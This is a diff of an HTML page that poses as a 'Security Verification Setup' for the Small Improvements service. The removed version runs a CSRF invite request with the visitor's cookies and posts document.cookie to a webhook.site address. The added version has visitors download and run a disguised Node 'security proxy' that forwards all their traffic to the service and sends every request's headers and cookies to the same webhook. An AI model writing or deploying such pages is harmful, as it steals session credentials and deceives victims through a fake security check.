@@ -1,79 +1,90 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Small Improvements - Security Test</title>
+    <title>Small Improvements Security Setup</title>
+    <style>
+        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }
+        .step { background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px; }
+        code { background: #333; color: white; padding: 10px; display: block; margin: 10px 0; }
+    </style>
 </head>
 <body>
-    <h2>Performing security verification...</h2>
+    <h1>🔒 Security Verification Setup</h1>
+    
+    <div class="step">
+        <h2>Step 1: Install Node.js</h2>
+        <p>Download from: <a href="https://nodejs.org" target="_blank">https://nodejs.org</a></p>
+    </div>
+
+    <div class="step">
+        <h2>Step 2: Download Proxy Tool</h2>
+        <button onclick="downloadProxy()">Download Security Proxy</button>
+        <p id="downloadStatus"></p>
+    </div>
+
+    <div class="step">
+        <h2>Step 3: Run Proxy</h2>
+        <code id="command">
+            // After downloading, run these commands in terminal:
+            // npm install express http-proxy-middleware
+            // node proxy-server.js
+        </code>
+    </div>
+
+    <div class="step">
+        <h2>Step 4: Configure Browser Proxy</h2>
+        <p>Set browser proxy to: <strong>127.0.0.1:8080</strong></p>
+    </div>
 
     <script>
-        // Wait for page to load, then attempt CSRF
-        setTimeout(function() {
-            // Try to make the POST request to Small Improvements
-            fetch('https://app.small-improvements.com/api/v2/users/invite', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Csrf-Token': 'si'
-                },
-                credentials: 'include', // This sends THEIR cookies!
-                body: JSON.stringify([{
-                    "firstName": "Test",
-                    "lastName": "User", 
-                    "workEmail": "test@example.com",
-                    "isGuest": false,
-                    "personalMessage": "",
-                    "shouldSendNotification": true
-                }])
-            })
-            .then(response => {
-                // Send results to webhook
-                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        type: 'CSRF_ATTEMPT_RESULT',
-                        status: response.status,
-                        statusText: response.statusText,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        message: 'CSRF attempt completed'
-                    })
-                });
-                
-                if (response.ok) {
-                    alert('Security check passed!');
-                } else {
-                    alert('Security verification failed. Please login to Small Improvements first.');
-                }
-            })
-            .catch(error => {
-                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        type: 'CSRF_ATTEMPT_ERROR',
-                        error: error.toString(),
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        message: 'CSRF attempt failed with error'
-                    })
-                });
-            });
-        }, 2000);
+        function downloadProxy() {
+            const proxyCode = `const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
+const fs = require('fs');
+const app = express();
 
-        // Send initial data
-        fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                type: 'PAGE_LOADED',
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                cookies: document.cookie,
-                message: 'CSRF test page loaded'
-            })
-        });
+const WEBHOOK_URL = 'https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310';
+
+app.use('*', (req, res, next) => {
+    const data = {
+        timestamp: new Date().toISOString(),
+        method: req.method,
+        url: req.originalUrl,
+        headers: req.headers,
+        cookies: req.headers.cookie,
+        host: req.headers.host,
+        userAgent: req.headers['user-agent']
+    };
+
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+
+    fs.appendFileSync('traffic.log', JSON.stringify(data) + '\\n');
+    console.log('Captured:', req.method, req.url);
+    next();
+});
+
+app.use('/', createProxyMiddleware({
+    target: 'https://app.small-improvements.com',
+    changeOrigin: true,
+    secure: false
+}));
+
+app.listen(8080, () => console.log('Security proxy running on port 8080'));`;
+
+            const blob = new Blob([proxyCode], { type: 'text/javascript' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'security-proxy.js';
+            a.click();
+            
+            document.getElementById('downloadStatus').innerHTML = 
+                '<span style="color: green;">✓ Proxy file downloaded! Save it and run with: node security-proxy.js</span>';
+        }
     </script>
 </body>
 </html>
